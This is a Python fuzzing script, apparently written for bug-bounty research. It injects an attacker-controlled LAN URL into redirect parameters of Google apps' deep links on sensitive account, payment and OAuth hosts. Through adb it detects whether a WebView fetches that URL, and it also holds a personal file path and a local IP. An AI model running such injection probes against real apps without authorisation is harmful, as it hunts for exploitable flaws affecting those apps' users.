#!/usr/bin/env python3
"""Inject attacker URL into Google BROWSABLE deep links; detect if a Google app's WebView
fetches it from our LAN server. A hit = proven script execution inside a Google WebView."""
import json, os, re, subprocess, sys, time, urllib.parse

HERE="/Users/sandiyochristan/Downloads/ExtractedApks/probe"
BASE="/Users/sandiyochristan/Downloads/ExtractedApks"
ME="192.168.1.36:8899"
LOG="/tmp/serve.log"

def sh(c): return subprocess.run(c,shell=True,capture_output=True,text=True,timeout=90)
def hits(): return len(open(LOG).read().splitlines()) if os.path.exists(LOG) else 0

PARAMS=["url","u","q","redirect","next","continue","link","href","target","location","site"]

CLAIMS=json.load(open(BASE+"/manifests/web_claims.json"))
SENS=re.compile(r"accounts\.google|myaccount|payments\.google|wallet|play\.google|"
                r"drive\.google|docs\.google|photos\.google|mail\.google|"
                r"oauth2redirect|oauth|login|signin|auth",re.I)

def targets():
    out=[]
    for host,comps in CLAIMS.items():
        if not SENS.search(host): continue
        for c in comps:
            if c.get("permission"): continue
            for p in (c["paths"] or [])[:2]:
                if p.startswith("@"): continue
                out.append((host,p,c["pkg"]))
    # dedupe
    seen=set(); ded=[]
    for h,p,pk in out:
        k=(h,p)
        if k in seen: continue
        seen.add(k); ded.append((h,p,pk))
    return ded

def fire(url,pkg,label):
    cmd={"type":"start","action":"android.intent.action.VIEW","data":url,"pkg":pkg,"label":label}
    open("/tmp/c.json","w").write(json.dumps(cmd))
    subprocess.run(["adb","push","/tmp/c.json","/sdcard/Android/data/com.vrp.probe/files/cmd.json"],
                   capture_output=True)
    sh("adb shell am force-stop com.vrp.probe")
    sh("adb shell am start -n com.vrp.probe/.UiActivity >/dev/null 2>&1")
    time.sleep(3.2)

if __name__=="__main__":
    tg=targets()
    print(f"sensitive claim targets: {len(tg)}")
    limit=int(sys.argv[1]) if len(sys.argv)>1 else 40
    found=[]
    for i,(host,path,pkg) in enumerate(tg[:limit]):
        for pname in PARAMS:
            tag=f"{host.split('.')[0]}_{re.sub(r'[^a-z0-9]','_',path)[:18]}_{pname}"
            u=f"https://{host}{path}?{pname}=http%3A%2F%2F{ME}%2FWEBVIEW_{tag}"
            before=hits()
            fire(u,pkg,tag)
            after=hits()
            if after>before:
                found.append((host,path,pname,pkg))
                print(f"  *** HIT #{i} {pkg}\n      {host}{path}  param={pname}")
                break
        if i%10==0: print(f"  ..{i}/{min(limit,len(tg))}",flush=True)
    print(f"\nTOTAL WEBVIEW HITS: {len(found)}")
    for f in found: print("   ",f)
